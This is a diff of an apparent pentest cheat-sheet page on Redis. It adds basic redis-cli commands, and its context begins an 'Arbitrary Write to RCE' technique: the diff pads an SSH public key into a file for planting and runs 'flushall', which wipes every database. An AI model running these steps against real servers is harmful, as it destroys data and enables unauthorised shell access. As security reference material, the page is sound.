@@ -43,7 +43,16 @@
 </ul>
 
 <div class="content"><hr>
-<h3 id="arbitrary-write-to-rce">Arbitrary Write to RCE</h3>
+<h3 id="basic-commands">Basic Commands</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Connect</span>
+</span></span><span class="line"><span class="cl">redis-cli -h 127.0.0.1
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># List current keys</span>
+</span></span><span class="line"><span class="cl">keys *
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Add key</span>
+</span></span><span class="line"><span class="cl">incr key
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Get key value</span>
+</span></span><span class="line"><span class="cl">get key
+</span></span></code></pre></div><h3 id="arbitrary-write-to-rce">Arbitrary Write to RCE</h3>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="o">(</span><span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="p">;</span> cat id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> -e <span class="s2">&#34;\n\n&#34;</span><span class="o">)</span> &gt; foo.txt
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Deletes all keys from all databases on current host</span>
 </span></span><span class="line"><span class="cl">redis-cli -h 127.0.0.1 flushall
